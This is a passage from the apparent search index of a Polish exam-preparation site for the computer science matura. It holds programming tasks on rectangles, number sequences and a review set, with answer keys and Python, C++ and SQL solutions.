rectangles[i + 1 :]:\n        result += intersection_area(rect1, rect2)\n\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-4","title":"Zadanie 4","text":"<pre><code>def is_inside(rect, xp, yp):\n    x1, y1, x2, y2 = rect\n    return x1 &lt; xp &lt; x2 and y2 &lt; yp &lt; y1\n\n\nwith open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\nresult = 0\nfor rect in rectangles:\n    if is_inside(rect, 0, 0):\n        print(*rect)\n        result += 1\n\nprint(\"\u0141\u0105cznie prostok\u0105t\u00f3w:\", result)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-5","title":"Zadanie 5","text":"<pre><code>def is_inside(rect, xp, yp):\n    x1, y1, x2, y2 = rect\n    return x1 &lt; xp &lt; x2 and y2 &lt; yp &lt; y1\n\n\nwith open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\nresult = 0\nfor i, rect1 in enumerate(rectangles):\n    for rect2 in rectangles[i + 1 :]:\n        x1, y1, x2, y2 = rect1\n        x3, y3, x4, y4 = rect2\n        if is_inside(rect1, x3, y3) and is_inside(rect1, x4, y4):\n            result += 1\n        elif is_inside(rect2, x1, y1) and is_inside(rect2, x2, y2):\n            result += 1\n\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-6","title":"Zadanie 6","text":"<pre><code>with open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\npoints = [(rect[0], rect[1]) for rect in rectangles]\npoints += [(rect[2], rect[3]) for rect in rectangles]\nmax_dist = 0\nfor i, point1 in enumerate(points):\n    for point2 in points[i + 1:]:\n        dist_sqr = ((point1[0] - point2[0]) ** 2 + (point1[1] - point2[1]) ** 2)\n        if dist_sqr &gt; max_dist:\n            max_dist = dist_sqr\n\nfor i, point1 in enumerate(points):\n    for point2 in points[i + 1:]:\n        dist_sqr = ((point1[0] - point2[0]) ** 2 + (point1[1] - point2[1]) ** 2)\n        if dist_sqr == max_dist:\n            print(point1, point2)\n\nprint(f\"Odleg\u0142o\u015b\u0107: {max_dist**0.5:0.2f}\")\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/","title":"Sekwencje","text":"<p>W pliku sequences.txt znajduje si\u0119 \\(10\\) wierszy. W ka\u017cdym wierszu znajduje si\u0119 liczba naturalna \\(n\\), a nast\u0119pnie sekwencja \\(n\\) liczb naturalnych z przedzia\u0142u \\([1,1000]\\) oddzielonych spacj\u0105.</p> <p> sequences.txt</p> <p>W pliku sequences_test.txt znajduje si\u0119 \\(10\\) wierszy, jak opisano powy\u017cej.</p> <p> sequences_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/#zadanie-1","title":"Zadanie 1","text":"<p>Dla ka\u017cdej sekwencji z pliku podaj sum\u0119 jej element\u00f3w. Dla pliku sequences_test.txt wynik to:</p> <pre><code>21784\n14030\n15888\n12353\n18191\n7084\n9632\n4959\n23868\n22518\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/#zadanie-2","title":"Zadanie 2","text":"<p>Dla ka\u017cdej sekwencji z pliku podaj najmniejsz\u0105 i najwi\u0119ksz\u0105 liczb\u0119 z tej sekwencji. Dla pliku sequences_test.txt wynik to:</p> <pre><code>Minimum: 13, Maksimum: 986\nMinimum: 50, Maksimum: 928\nMinimum: 44, Maksimum: 998\nMinimum: 28, Maksimum: 927\nMinimum: 9, Maksimum: 981\nMinimum: 57, Maksimum: 960\nMinimum: 20, Maksimum: 989\nMinimum: 129, Maksimum: 801\nMinimum: 31, Maksimum: 984\nMinimum: 13, Maksimum: 994\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej sekwencji z pliku podaj ile liczb z tej sekwencji jest liczbami pierwszymi oraz wypisz te liczby. Dla pliku sequences_test.txt wynik to:</p> <pre><code>Ile pierwszych: 5, Liczby pierwsze: 13 457 739 797 37\nIle pierwszych: 2, Liczby pierwsze: 197 907\nIle pierwszych: 3, Liczby pierwsze: 227 857 617\nIle pierwszych: 3, Liczby pierwsze: 661 853 433\nIle pierwszych: 4, Liczby pierwsze: 439 971 631 269\nIle pierwszych: 1, Liczby pierwsze: 521\nIle pierwszych: 0, Liczby pierwsze:\nIle pierwszych: 3, Liczby pierwsze: 491 443 577\nIle pierwszych: 7, Liczby pierwsze: 761 211 409 599 31 241 127\nIle pierwszych: 4, Liczby pierwsze: 41 13 373 587\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdej sekwencji z pliku podaj jej najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g rosn\u0105cy, tzn. taki podci\u0105g s\u0105siednich warto\u015bci, \u017ce ka\u017cda kolejna jest d\u0142u\u017csza od poprzedniej. Podaj d\u0142ugo\u015b\u0107 tego podci\u0105gu jak i sam podci\u0105g. Dla pliku sequences_test.txt wynik to:</p> <pre><code>Dlugosc: 5, Sekwencja: 78 84 720 776 878\nDlugosc: 4, Sekwencja: 256 585 844 917\nDlugosc: 3, Sekwencja: 227 514 655\nDlugosc: 2, Sekwencja: 95 676\nDlugosc: 4, Sekwencja: 360 666 704 899\nDlugosc: 2, Sekwencja: 521 688\nDlugosc: 4, Sekwencja: 300 362 470 645\nDlugosc: 3, Sekwencja: 295 577 738\nDlugosc: 4, Sekwencja: 166 280 831 897\nDlugosc: 4, Sekwencja: 80 262 435 657\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdej sekwencji z pliku podaj ile jest w niej par liczb wzgl\u0119dnie pierwszych. Liczby wzgl\u0119dnie pierwsze to takie, kt\u00f3re nie maj\u0105 wsp\u00f3lnego dzielnika poza warto\u015bci\u0105 1. Dla pliku sequences_test.txt wynik to:</p> <pre><code>388\n172\n231\n155\n327\n46\n78\n34\n493\n657\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>163568\n100531\n212025\n68600\n69721\n106678\n154737\n92454\n48619\n143834\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>Minimum: 1, Maksimum: 998\nMinimum: 4, Maksimum: 997\nMinimum: 1, Maksimum: 999\nMinimum: 6, Maksimum: 990\nMinimum: 3, Maksimum: 991\nMinimum: 3, Maksimum: 989\nMinimum: 1, Maksimum: 999\nMinimum: 5, Maksimum: 996\nMinimum: 4, Maksimum: 996\nMinimum: 1, Maksimum: 1000\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>Ile pierwszych: 47, Liczby pierwsze: 997 173 127 967 733 787 887 541 311 617 61 991 523 809 467 199 499 941 383 937 433 149 67 179 409 691 479 373 47 401 73 887 521 563 613 389 151 277 863 751 157 769 263 607 43 919 857\nIle pierwszych: 38, Liczby pierwsze: 947 53 509 137 643 41 233 953 151 569 181 521 683 47 577 521 421 107 727 491 761 929 367 239 941 541 997 883 947 719 199 367 347 47 433 787 719 271\nIle pierwszych: 85, Liczby pierwsze: 71 37 907 853 823 281 571 211 223 883 373 613 937 83 317 179 229 149 491 877 107 97 433 139 101 971 349 701 641 829 769 727 89 193 379 241 877 911 769 503 479 659 251 113 379 859 503 19 179 773 419 439 397 191 29 331 47 71 727 569 223 113 929 281 359 739 367 757 773 863 599 19 13 383 101 751 607 193 593 997 241 673 587 421 349\nIle pierwszych: 27, Liczby pierwsze: 587 349 383 251 449 13 419 149 37 971 19 967 577 23 739 97 701 317 317 859 13 61 601 211 179 191 269\nIle pierwszych: 26, Liczby pierwsze: 929 773 211 3 43 401 53 281 31 991 197 97 983 29 983 43 523 857 107 659 367 709 313 853 211 17\nIle pierwszych: 41, Liczby pierwsze: 919 691 751 7 509 467 463 59 331 757 167 881 331 211 19 293 683 331 223 23 311 71 293 131 97 157 421 557 3 773 31 337 179 401 709 571 523 31 263 761 113\nIle pierwszych: 40, Liczby pierwsze: 521 587 911 797 281 2 991 787 19 577 149 919 487 743 109 907 3 151 829 829 479 239 383 569 7 499 191 241 991 449 677 659 3 947 503 53 659 281 569 983\nIle pierwszych: 32, Liczby pierwsze: 23 647 271 937 103 67 47 577 199 83 79 157 389 443 431 563 457 173 193 811 983 401 829 389 29 313 191 227 691 5 449 907\nIle pierwszych: 13, Liczby pierwsze: 617 409 853 439 19 71 587 277 167 151 83 967 929\nIle pierwszych: 48, Liczby pierwsze: 151 271 379 419 809 659 257 563 373 17 467 617 151 97 929 967 409 349 229 43 11 277 719 827 197 607 223 479 41 757 719 883 103 857 113 19 467 577 457 271 929 677 269 61 127 73 241 569\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>Dlugosc: 5, Sekwencja: 60 141 288 630 633\nDlugosc: 5, Sekwencja: 93 183 421 620 979\nDlugosc: 5, Sekwencja: 28 118 160 179 554\nDlugosc: 4, Sekwencja: 13 516 788 835\nDlugosc: 4, Sekwencja: 32 187 404 765\nDlugosc: 6, Sekwencja: 97 157 421 496 534 557\nDlugosc: 7, Sekwencja: 225 242 248 438 579 598 862\nDlugosc: 5, Sekwencja: 231 401 800 817 850\nDlugosc: 5, Sekwencja: 92 110 350 434 878\nDlugosc: 5, Sekwencja: 185 236 450 563 958\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>33238\n12940\n62642\n5986\n5905\n14273\n27222\n11538\n3155\n26190\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/","title":"Rozwi\u0105zanie - C++","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/#zadanie-1","title":"Zadanie 1","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"sequences_test.txt\");\n    for (int line = 0; line &lt; 10; line++)\n    {\n        int n, sum = 0, num;\n        file &gt;&gt; n;\n        for (int i = 0; i &lt; n; i++)\n        {\n            file &gt;&gt; num;\n            sum += num;\n        }\n\n        cout &lt;&lt; sum &lt;&lt; endl;\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/#zadanie-2","title":"Zadanie 2","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"sequences_test.txt\");\n    for (int line = 0; line &lt; 10; line++)\n    {\n        int n, min_val = 2000, max_val = 0, num;\n        file &gt;&gt; n;\n\n        for (int i = 0; i &lt; n; i++)\n        {\n            file &gt;&gt; num;\n\n            if (num &gt; max_val)\n            {\n                max_val = num;\n            }\n            else if (num &lt; min_val)\n            {\n                min_val = num;\n            }\n        }\n\n        cout &lt;&lt; \"Minimum: \" &lt;&lt; min_val;\n        cout &lt;&lt; \", Maksimum: \" &lt;&lt; max_val &lt;&lt; endl;\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/#zadanie-3","title":"Zadanie 3","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nbool is_prime(int n)\n{\n    if (n &lt; 2)\n    {\n        return false;\n    }\n\n    for (int i = 2; i * i &lt;= n; i++)\n    {\n        if (n % i == 0)\n        {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nint main() {\n    ifstream file(\"sequences_test.txt\");\n    for (int line = 0; line &lt; 10; line++)\n    {\n        int n, num;\n        vector&lt;int&gt; primes;\n        file &gt;&gt; n;\n        for (int i = 0; i &lt; n; i++)\n        {\n            file &gt;&gt; num;\n            if (is_prime(num))\n            {\n                primes.push_back(num);\n            }\n        }\n\n        cout &lt;&lt; \"Ile pierwszych: \" &lt;&lt; primes.size();\n        cout &lt;&lt; \", Liczby pierwsze: \";\n        for (auto num : primes)\n        {\n            cout &lt;&lt; num &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/#zadanie-4","title":"Zadanie 4","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"sequences_test.txt\");\n    for (int line = 0; line &lt; 10; line++)\n    {\n        int n, current_length = 1, max_length = 1;\n        int current_start = 0, max_start = 0;\n        file &gt;&gt; n;\n        int seq[n];\n        file &gt;&gt; seq[0];\n        for (int i = 1; i &lt; n; i++)\n        {\n            file &gt;&gt; seq[i];\n            if (seq[i] &gt; seq[i - 1])\n            {\n                current_length++;\n                if (current_length &gt; max_length)\n                {\n                    max_length = current_length;\n                    max_start = current_start;\n                }\n            }\n            else\n            {\n                current_length = 1;\n                current_start = i;\n            }\n        }\n\n        cout &lt;&lt; \"Dlugosc: \" &lt;&lt; max_length;\n        cout &lt;&lt; \", Sekwencja: \";\n        for (int i = max_start; i &lt; max_start + max_length; i++)\n        {\n            cout &lt;&lt; seq[i] &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-cpp/#zadanie-5","title":"Zadanie 5","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"sequences_test.txt\");\n    for (int line = 0; line &lt; 10; line++)\n    {\n        int n;\n        file &gt;&gt; n;\n        int seq[n];\n        for (int i = 0; i &lt; n; i++)\n        {\n            file &gt;&gt; seq[i];\n        }\n\n        int count = 0;\n        for (int i = 0; i &lt; n; i++)\n        {\n            for (int j = i + 1; j &lt; n; j++)\n            {\n                if (__gcd(seq[i], seq[j]) == 1)\n                {\n                    count++;\n                }\n            }\n        }\n\n        cout &lt;&lt; count &lt;&lt; endl;\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/","title":"Rozwi\u0105zania - Python","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/#zadanie-1","title":"Zadanie 1","text":"<pre><code>with open(\"sequences.txt\") as file:\n    sequences = []\n    for line in file:\n        sequences.append(list(map(int, line.split()))[1:])\n\nfor seq in sequences:\n    print(sum(seq))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/#zadanie-2","title":"Zadanie 2","text":"<pre><code>with open(\"sequences.txt\") as file:\n    sequences = []\n    for line in file:\n        sequences.append(list(map(int, line.split()))[1:])\n\nfor seq in sequences:\n    print(f\"Minimum: {min(seq)}, Maksimum: {max(seq)}\")\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/#zadanie-3","title":"Zadanie 3","text":"<pre><code>def is_prime(n):\n    if n &lt; 2:\n        return False\n\n    i = 2\n    while i * i &lt;= n:\n        if n % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nwith open(\"sequences.txt\") as file:\n    sequences = []\n    for line in file:\n        sequences.append(list(map(int, line.split()))[1:])\n\nfor seq in sequences:\n    primes = []\n    for num in seq:\n        if is_prime(num):\n            primes.append(num)\n\n    print(f\"Ile pierwszych: {len(primes)}, Liczby pierwsze: \", end=\"\")\n    print(*primes)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/#zadanie-4","title":"Zadanie 4","text":"<pre><code>with open(\"sequences.txt\") as file:\n    sequences = []\n    for line in file:\n        sequences.append(list(map(int, line.split()))[1:])\n\nfor seq in sequences:\n    current_length = max_length = 1\n    current_start = max_start = 0\n    for i in range(1, len(seq)):\n        if seq[i] &gt; seq[i - 1]:\n            current_length += 1\n            if current_length &gt; max_length:\n                max_length = current_length\n                max_start = current_start\n        else:\n            current_length = 1\n            current_start = i\n\n    print(f\"Dlugosc: {max_length}, Sekwencja: \", end=\"\")\n    print(*seq[max_start : max_start + max_length])\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/sequences/solution-python/#zadanie-5","title":"Zadanie 5","text":"<pre><code>from math import gcd\n\nwith open(\"sequences.txt\") as file:\n    sequences = []\n    for line in file:\n        sequences.append(list(map(int, line.split()))[1:])\n\nfor seq in sequences:\n    count = 0\n    for i in range(len(seq)):\n        for j in range(i + 1, len(seq)):\n            if gcd(seq[i], seq[j]) == 1:\n                count += 1\n\n    print(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/","title":"Powt\u00f3rzenie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-1","title":"Zadanie 1","text":"<p>W pliku <code>long_bin.txt</code> zapisano jedn\u0105 liczb\u0119 naturaln\u0105 w systemie binarnym w postaci ci\u0105gu zer i jedynek. Ci\u0105g sk\u0142ada si\u0119 ze 1000 znak\u00f3w.</p> <p> long_bin.txt</p> <p>W pliku <code>short_bin.txt</code> zapisano jedn\u0105 liczb\u0119 naturaln\u0105 w systemie binarnym w postaci ci\u0105gu zer i jedynek. Ci\u0105g sk\u0142ada si\u0119 ze 100 znak\u00f3w.</p> <p> short_bin.txt</p> <p>Znajd\u017a najd\u0142u\u017cszy sp\u00f3jny podci\u0105g sk\u0142adaj\u0105cy si\u0119 z takich samych znak\u00f3w, np. samych zer albo samych jedynek. Podaj d\u0142ugo\u015b\u0107 tego podci\u0105gu, znak z jakiego si\u0119 sk\u0142ada oraz numer znaku pocz\u0105tkowego i numer znaku ko\u0144cowego w ci\u0105gu. Je\u017celi jest kilka takich podci\u0105g\u00f3w wypisz pierwszy z nich.</p> <p>Odpowied\u017a dla pliku <code>short_bin.txt</code> to:</p> <ul> <li>d\u0142ugo\u015b\u0107: 7</li> <li>pocz\u0105tek: 26</li> <li>koniec: 32</li> <li>znak: 0</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-2","title":"Zadanie 2","text":"<p>Dane s\u0105 trzy tabele opisuj\u0105ce oceny uczni\u00f3w z poszczeg\u00f3lnych przedmiot\u00f3w, tak jak przedstawiono poni\u017cej.</p> <pre><code>erDiagram\n    Oceny }o--|| Uczniowie : \"\"\n    Oceny }o--|| Przedmioty : \"\"\n\n    Uczniowie {\n        INTEGER id PK\n        TEXT imie\n        TEXT nazwisko\n    }\n\n    Przedmioty {\n        INTEGER id PK\n        TEXT nazwa\n    }\n\n    Oceny {\n        INTEGER id PK\n        INTEGER ocena\n        INTEGER uczen_id FK\n        INTEGER przedmiot_id FK\n    }</code></pre> <p>Podaj komend\u0119 SQL, kt\u00f3ra wypisze imi\u0119, nazwisko, nazw\u0119 przedmiotu i \u015bredni\u0105 z tego przedmiotu, uwzgl\u0119dniaj\u0105c wy\u0142\u0105cznie matematyk\u0119 i informatyk\u0119, dla ka\u017cdego ucznia, kt\u00f3ry z ka\u017cdego z tych dw\u00f3ch przedmiot\u00f3w otrzyma\u0142 \u015bredni\u0105 powy\u017cej 5. Wyniki powinny by\u0107 posortowane rosn\u0105co po \u015bredniej.</p>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-3","title":"Zadanie 3","text":"<p>W pliku <code>visits.txt</code> znajduje si\u0119 lista odwiedzin strony internetowej. Ka\u017cda linia zawiera dane jednej sesji. Dane te zawieraj\u0105 dat\u0119 i godzin\u0119 rozpocz\u0119cia sesji, dat\u0119 i godzin\u0119 zako\u0144czenia sesji, adres strony internetowej oraz adres IP u\u017cytkownika. Dane s\u0105 oddzielone \u015brednikiem. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> visits.txt</p> <p>Ze wzgl\u0119du na b\u0142\u0105d programu rejestruj\u0105cego wyniki, niekt\u00f3re wpisy s\u0105 b\u0142\u0119dne. Mo\u017cna je rozpozna\u0107 po tym, \u017ce rozpocz\u0119cie sesji jest p\u00f3\u017aniejsze ni\u017c jej zako\u0144czenie.</p> <p>Odpowiedz na poni\u017csze pytania:</p> <ol> <li>Ile jest b\u0142\u0119dnie zarejestrowanych wpis\u00f3w?</li> <li>Kt\u00f3ra strona by\u0142a najcz\u0119\u015bciej odwiedzana (ignoruj\u0105c b\u0142\u0119dne wpisy)?</li> <li>Kt\u00f3ra strona by\u0142a sumarycznie najd\u0142u\u017cej odwiedzana (ignoruj\u0105c b\u0142\u0119dne wpisy)?</li> </ol>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-4","title":"Zadanie 4","text":"<p>Jasiu wymy\u015bli\u0142 now\u0105 gr\u0119. Przed nim, na stole, u\u0142o\u017conych jest wiele kolorowych kart. Procedura, za kt\u00f3r\u0105 pod\u0105\u017ca Jasiu wygl\u0105da nast\u0119puj\u0105co:</p> <pre><code>1. Dop\u00f3ki s\u0105 jeszcze karty na stole, wykonuj:\n    2. We\u017a kolejn\u0105 kart\u0119 do prawej r\u0119ki.\n    3. Je\u017celi lewa r\u0119ka jest pusta, to prze\u0142\u00f3\u017c kart\u0119 z prawej r\u0119ki do lewej i id\u017a do kroku 1.\n    4. Je\u017celi karty na lewej i prawej r\u0119ce s\u0105 takie same, to prze\u0142\u00f3\u017c kart\u0119 z prawej r\u0119ki do lewej i id\u017a do kroku 1.\n    5. Je\u017celi karty na lewej i prawej r\u0119ce s\u0105 r\u00f3\u017cne, to odzu\u0107 po jednej karcie z prawej i lewej r\u0119ki.\n</code></pre> <p>Jasiu zastanawia si\u0119, dla danego uk\u0142adu kart na stole, ile kart b\u0119dzie trzyma\u0142 w lewej r\u0119ce i jakiego koloru po zako\u0144czeniu procedury. Dla u\u0142atwienia Jasiu ponumerowa\u0142 kolory kart kolejnymi liczbami naturalnymi. Pom\u00f3\u017c Jasiowi oblliczy\u0107 wynik dla danego uk\u0142adu kart.</p> Karty Liczba kart na lewej r\u0119ce Kolor karty na lewej r\u0119ce 2, 5, 1, 1, 2, 1, 1 3 1 2, 2, 1, 1 0 - 2, 2, 3, 2, 4, 2, 3 3, 2, 3, 2, 3, 5, 5 <p>Jasiu ma ma\u0142e d\u0142onie i zastanawia si\u0119, czy zdo\u0142a utrzyma\u0107 wszystkie karty w lewej r\u0119ce, dlatego zwr\u00f3ci\u0142 si\u0119 o pomoc do Ciebie. Zaprojektuj algorytm, kt\u00f3ry obliczy i wypisze ile maksymalnie kart Jasiu b\u0119dzie musia\u0142 trzyma\u0107 w lewej r\u0119ce dla danego uk\u0142adu kart. Algorytm powinien by\u0107 zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Uwaga: w swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p> <p>Dane:</p> <ul> <li>\\(n\\) - liczba naturalna, liczba kart na stole, \\(n&gt;0\\)</li> <li>\\(karty[1..n]\\) - tablica liczb naturalnych, kolejne liczby to kolory kart na stole, tablica jest indeksowana od jedynki</li> </ul> <p>Wynik:</p> <ul> <li>\\(maks\\_kart\\) - liczba naturalna, maksymalna liczba kart, kt\u00f3re Jasiu b\u0119dzie musia\u0142 trzyma\u0107 w lewej r\u0119ce w dowolnym momencie wykonywania swojej gry.</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-5","title":"Zadanie 5","text":"<p>W pliku <code>u2.txt</code> znajduje si\u0119 100 liczb zapisanych w systemie U2, ka\u017cda w osobnej linii.</p> <p> u2.txt</p> <p>W pliku <code>u2_test.txt</code> znajduje si\u0119 10 liczb zapisanych w systemie U2, ka\u017cda w osobnej linii.</p> <p> u2_test.txt</p> <p>Podaj najmniejsz\u0105 i najwi\u0119ksz\u0105 liczb\u0119 z pliku <code>u2.txt</code>. Dla pliku <code>u2_test.txt</code> odpowied\u017a to:</p> <ul> <li>najmniejsza liczba: \\(100110000_{U2}\\)</li> <li>najwi\u0119ksza liczba: \\(000101101_{U2}\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/#zadanie-6","title":"Zadanie 6","text":"<p>W pliku <code>characters.txt</code> znajduj\u0105 si\u0119 dane dotycz\u0105ce pewnych postaci. Ka\u017cda linia zawiera dane jednej postaci, tzn. jej identyfikator, nazw\u0119, wzrost (w cm), wag\u0119 (w kg), oraz dat\u0119 powstania. Dane s\u0105 oddzielone \u015brednikiem. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> characters.txt</p> <p>W pliku <code>equipment.txt</code> znajduj\u0105 si\u0119 dane dotycz\u0105ce ekwipunku pewnych postaci. Ka\u017cda linia zawiera dane jednego przedmiotu, tzn. jego identyfikator, nazw\u0119 oraz cen\u0119 (w z\u0142ot\u00f3wkach). Dane s\u0105 oddzielone \u015brednikiem. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> equipment.txt</p> <p>W pliku <code>characters_equipment.txt</code> znajduj\u0105 si\u0119 dane o ekwipunku postaci. Ka\u017cda linia zawiera dwie liczby: identyfikator postaci oraz identyfikator ekwipunku. Dane s\u0105 oddzielone \u015brednikiem. Pierwszy wiersz zawiera nag\u0142\u00f3wki kolumn.</p> <p> characters_equipment.txt</p> <p>Podaj ile jest takich postaci, kt\u00f3re urodzi\u0142y si\u0119 w miesi\u0105cach od stycznia do czerwca w\u0142\u0105cznie, ich wzrost wynosi powy\u017cej 180 cm lub waga poni\u017cej 70 kg oraz nie posiadaj\u0105 przedmiotu w ekwipunku dro\u017cszego ni\u017c 1000 z\u0142otych.</p> <p>Podaj identyfikator oraz nazw\u0119 pierwszej i ostatniej takiej postaci, po posortowaniu ich rosn\u0105co po identyfikatorach.</p>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-1","title":"Zadanie 1","text":"<ul> <li>D\u0142ugo\u015b\u0107: 10</li> <li>Pocz\u0105tek: 702</li> <li>Koniec: 711</li> <li>Znak: 1</li> </ul> <p>=== Python</p> <pre><code>```python linenums=\"1\"\nwith open(\"long_bin.txt\") as file:\n    bin_num = file.read().strip()\n\ncurrent_digit = \"\"\ncurrent_length = 0\ncurrent_start = 0\nmax_length = 0\nmax_start = 0\nmax_digit = \"\"\n\nfor i, digit in enumerate(bin_num):\n    if digit == current_digit:\n        current_length += 1\n    else:\n        current_digit = digit\n        current_length = 1\n        current_start = i\n\n    if current_length &gt; max_length:\n        max_length = current_length\n        max_start = current_start\n        max_digit = current_digit\n\nprint(\"D\u0142ugo\u015b\u0107:\", max_length)\nprint(\"Pocz\u0105tek:\", max_start + 1)\nprint(\"Koniec:\", max_start + max_length)\nprint(\"Znak:\", max_digit)\n```\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-2","title":"Zadanie 2","text":"<pre><code>SELECT imie, nazwisko, nazwa, AVG(ocena) AS srednia\nFROM Oceny\nJOIN Uczniowie ON Oceny.uczen_id = Uczniowie.id\nJOIN Przedmioty ON Oceny.przedmiot_id = Przedmioty.id\nWHERE nazwa = 'matematyka' OR nazwa = 'informatyka'\nGROUP BY Uczniowie.id, imie, nazwisko, nazwa\nHAVING srednia &gt; 5\nORDER BY srednia ASC;\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-3","title":"Zadanie 3","text":"<ul> <li>Liczba b\u0142\u0119dnych wpis\u00f3w:   493</li> <li>Najcz\u0119\u015bciej odwiedzana strona:    huff.com</li> <li>Najd\u0142u\u017cej odwiedzana strona:  allen.com</li> </ul> <p> visits-solution.xlsx</p>"},{"location":"matura-z-informatyki/przygotowanie/repetition/repeat-1/solutions/#zadanie-4","title":"Zadanie 4","text":"Karty Liczba kart na lewej r\u0119ce Kolor karty na lewej r\u0119ce 2, 5, 1, 1, 2, 1, 1 3 1 2, 2, 1, 1 0 - 2, 2, 3, 2, 4, 2, 3 1 2 3, 2, 3, 2, 3, 5, 5 1 5 <pre><code>1. lewa_kolor := 0\n2. lewa_licznik := 0\n3. maks_licznik := 0\n4. Dla i := 1 do n, 